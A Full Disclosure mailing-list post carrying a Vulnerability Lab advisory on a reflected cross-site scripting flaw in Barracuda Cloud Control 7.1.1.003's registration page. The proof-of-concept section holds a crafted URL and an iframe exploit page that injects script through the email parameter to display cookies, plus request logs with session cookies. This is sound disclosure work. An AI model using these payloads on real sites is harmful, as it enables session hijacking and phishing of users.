
Date: Wed, 18 Jul 2018 16:21:50 +0200
From: Vulnerability Lab <research@...nerability-lab.com>
To: fulldisclosure@...lists.org
Subject: [FD] Barracuda Cloud Control 7.1.1.003 - Cross Site Scripting
 Vulnerability

Document Title:
===============
Barracuda Cloud Control 7.1.1.003 - Cross Site Scripting Vulnerability


References (Source):
====================
https://www.vulnerability-lab.com/get_content.php?id=1992


Release Date:
=============
2018-07-17


Vulnerability Laboratory ID (VL-ID):
====================================
1992


Common Vulnerability Scoring System:
====================================
3.3


Vulnerability Class:
====================
Cross Site Scripting - Non Persistent


Current Estimated Price:
========================
500€ - 1.000€


Product & Service Introduction:
===============================
The Barracuda Control Center is a comprehensive cloud-based service that
enables administrators to monitor and configure multiple
Barracuda Networks products from a single console. With the Barracuda
Control Center, you can check the health of all connected
devices, run reports that are generated by gathering data from all the
devices, and assign roles with varied permissions to different
types of users. The powerful Web interface of the Barracuda Control
Center provides for convenient configuration and management of
multiple Barracuda Networks device settings, while also providing a view
of each device Web interface for individual configuration
or reporting. No need to install software or deploy hardware. Key
statistics can be viewed by device type at a glance on the Status
page of the Web interface with the ability to drill down for more detail
into the individual Web interface for each connected device.

(Copy of the Vendor Homepage:
https://www.barracudanetworks.com/ns/downloads/Setup_Guides/Barracuda_Cloud_Control_SG_US.pdf)


Abstract Advisory Information:
==============================
The vulnerability laboratory core research team discovered a cross site
vulnerability in the official Barracuda Networks Cloud Control 7.1.1.003.


Vulnerability Disclosure Timeline:
==================================
2018-07-17: Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Affected Product(s):
====================
Barracuda Networks
Product: Cloud Control Center 7.1.1.003


Exploitation Technique:
=======================
Remote


Severity Level:
===============
Medium


Authentication Type:
====================
No authentication (guest)


User Interaction:
=================
Low User Interaction


Disclosure Type:
================
Responsible Disclosure Program


Technical Details & Description:
================================
A client-side cross site scripting vulnerability has been discovered in
the official Barracuda Networks Cloud Control v7.1.1.003 appliance
web-application.
The cross site vulnerability allows remote attackers to inject own
malicious script codes to client-side browser to web-application
requests to compromise
session credentials or client-side web context.

The cross site scripting web vulnerability is located in the `email`
parameter of the `./new_user/success/` registration module. Remote
attackers with
knowledge about an exisiting email are able to attach the exisiting
email with a payload to the thanks page request. Thus allows the remote
attacker to
trigger a client-side cross site scripting issue within the thank you
page of the barracuda cloud control registration mechanism. The request
method to
inject is GET and the attack vector is located on the client-side of the
online service web-application.

The security risk of the cross site scripting web vulnerability is
estimated as medium with a cvss (common vulnerability scoring system)
count of 3.3.
Exploitation of the client-side cross site web vulnerability requires no
privileged web-application user account and low or medium user interaction.
Successful exploitation of the vulnerability results in non-persistent
phishing, session hijacking, non-persistent external redirect to malicious
sources and client-side manipulation of affected or connected web module
context.

Request Method(s):
[+] GET

Vulnerable Module(s):
[+] ./new_user/success/

Vulnerable Parameter(s):
[+] email


Proof of Concept (PoC):
=======================
The cross site scripting vulnerability can be exploited by remote
attackers without privileged web-application user account and with low
user interaction.
For security demonstration or to reproduce the vulnerability follow the
provided information and steps below to continue.


Standard: URL
https://cc.localhost:8000/new_user/success/?email=bkm%40evolution-sec.com%20%3E%3Ca%20%3E


PoC: URL
https://cc.localhost:8000/new_user/success/?email=bkm%40evolution-sec.com%20%3E%3Ca%20%3E%20>"<%20<iframe
src=./evil.source onload=alert(document.cookie) <


PoC: Exploit
<html>
<head><body>
<title>Barracuda Networks Cloud Control v7.1.1.003 - Remote Cross Site
Scripting Vulnerability</title>
<iframe
src=https://cc.localhost:8000/new_user/success/?email=bkm%40evolution-sec.com%20%3E%3Ca%20%3E%20>"<%20<iframe
src=./evil.source onload=alert(document.cookie) < %00>
<iframe
src=https://cc.localhost:8000/new_user/success/?email=bkm%40evolution-sec.com%20%3E%3Ca%20%3E%20>"<%20<iframe
src=./evil.source onload=alert(document.domain) < %00>
</head></body>
</html>


PoC: Thank You - Registration Page
<div id="cui-content-inner">
<!-- cui-title: Thank You > Barracuda Networks --><!-- cui-css:
/include/css/cloud/new_account_success.css -->
<div class="cui-form-signin-logo"></div>
<table class="cui-form-signin-outer"><tbody><tr>
<td class="cui-form-signin-wrapper">
<div class="cui-form-signin">
<div class="cui-form-signin-bitemark"></div>
<h2 class="cui-page-title">Thank You</h2>	
<div class="cui-page-content" id="" style="top: 43px;">
<div class="cui-page-module page_module">
<div class="create_success">
<h2>Your Barracuda Networks user has been created.</h2>
<p>Please follow the instructions emailed to <b>bkm@...lution-sec.com
20%3E%3Ca%20%3E%20>"<%20<iframe src=./evil.source
onload=alert(document.domain) < %00></b>
to log in and create an account.</p>
</div></div></div></div>
</td>
</tr></tbody></table>
<style type="text/css">.create_success {
padding: 15px;
background: url('/cui/images/checkbox.png') center 50px no-repeat;
text-align: center;
}
.create_success h2 {
font-size: 150%;
padding-bottom: 90px;
}
.create_success p {
font-size: 125%;
text-align: center;
}</style></div>


--- PoC Session Logs [GET] ---
Status: 200[OK]
GET
https://cc.localhost:8000/new_user/success/?email=bkm%40evolution-sec.com%20%3E%3Ca%20%3E%20>"<%20<iframe
src=./evil.source onload=alert(document.domain) < %00>
Mime Type[text/html]
Request Header:
      Host[cc.localhost:8000]
      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:49.0)
Gecko/20100101 Firefox/49.0]

Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
      Cookie[backup_session=03d2d8r7cf752jknkc9esfhet5;
CLOUD_LOCALE=en_US; BNI_CLOUD_AT=0000000000000000000000001f20800a00005000;
	_ga=GA1.2.1374742774.1477554133; _gat=1; mfa=0;
CLOUD_LAST_LOCALE=en_US; cloud_session=44kti8ik7qdnb57kdfftfehje3]
      Connection[keep-alive]
      Upgrade-Insecure-Requests[1]
Response Header:
      Date[x]
      X-Frame-Options[SAMEORIGIN]
      Cache-Control[no-store, no-cache, must-revalidate, post-check=0,
pre-check=0]
      Pragma[no-cache]
      Set-Cookie[CLOUD_LOCALE=en_US; expires=Tue, 25-Apr-2017 07:44:45
GMT; Max-Age=15552000; path=/; domain=.localhost:8000; secure
	cloud_session=44kti8ik7qdnb57kdfftfehje3; path=/; domain=.localhost:8000
	BNI_CLOUD_AT=0000000000000000000000001f20800a00005000; Path=/]
      X-Cloud-Auth[0]
      Vary[Accept-Encoding,User-Agent]
      Connection[Keep-Alive]
      Content-Type[text/html; charset=UTF-8]
      Transfer-Encoding[chunked]


Reference(s):
https://cc.localhost:8000/
https://cc.localhost:8000/new_user/
https://cc.localhost:8000/new_user/success/


Solution - Fix & Patch:
=======================
The vulnerability can be patched by a parse of the vulnerable email
parameter in the thank you registration page of barracuda networks cc
application.
Parse in the vulnerable output location the source to prevent the
execution of the client-side injected payloads. Disallow the usage of
special chars
on parameter requests via GET method.


Security Risk:
==============
The security risk of the client-side cross site scripting web
vulnerability in the cloud control web-application is estimated as medium.


Credits & Authors:
==================
Benjamin K.M. (Vulnerability Laboratory Core Research Team) -
https://www.vulnerability-lab.com/show.php?user=Benjamin+K.M.


Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without
any warranty. Vulnerability Lab disclaims all warranties, either
expressed or
implied, including the warranties of merchantability and capability for
a particular purpose. Vulnerability-Lab or its suppliers are not liable
in any
case of damage, including direct, indirect, incidental, consequential
loss of business profits or special damages, even if Vulnerability Labs
or its
suppliers have been advised of the possibility of such damages. Some
states do not allow the exclusion or limitation of liability mainly for
incidental
or consequential damages so the foregoing limitation may not apply. We
do not approve or encourage anybody to break any licenses, policies, deface
websites, hack into databases or trade with stolen data. We have no need
for criminal activities or membership requests. We do not publish
advisories
or vulnerabilities of religious-, militant- and racist-
hacker/analyst/researcher groups or individuals. We do not publish trade
researcher mails,
phone numbers, conversations or anything else to journalists,
investigative authorities or private individuals.

Domains:    www.vulnerability-lab.com		- www.vulnerability-db.com					-
www.evolution-sec.com
Programs:   vulnerability-lab.com/submit.php 	-
vulnerability-lab.com/list-of-bug-bounty-programs.php 	-
vulnerability-lab.com/register.php
Feeds:	    vulnerability-lab.com/rss/rss.php 	-
vulnerability-lab.com/rss/rss_upcoming.php 			-
vulnerability-lab.com/rss/rss_news.php
Social:	    twitter.com/vuln_lab		- facebook.com/VulnerabilityLab 				-
youtube.com/user/vulnerability0lab

Any modified copy or reproduction, including partially usages, of this
file, resources or information requires authorization from Vulnerability
Laboratory.
Permission to electronically redistribute this alert in its unmodified
form is granted. All other rights, including the use of other media, are
reserved by
Vulnerability Lab Research Team or its suppliers. All pictures, texts,
advisories, source code, videos and other information on this website is
trademark
of vulnerability-lab team & the specific authors or managers. To record,
list, modify, use or edit our material contact (admin@) to get an ask
permission.

				    Copyright © 2018 | Vulnerability Laboratory - [Evolution
Security GmbH]™




-- 
VULNERABILITY LABORATORY - RESEARCH TEAM
SERVICE: www.vulnerability-lab.com

_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: http://seclists.org/fulldisclosure/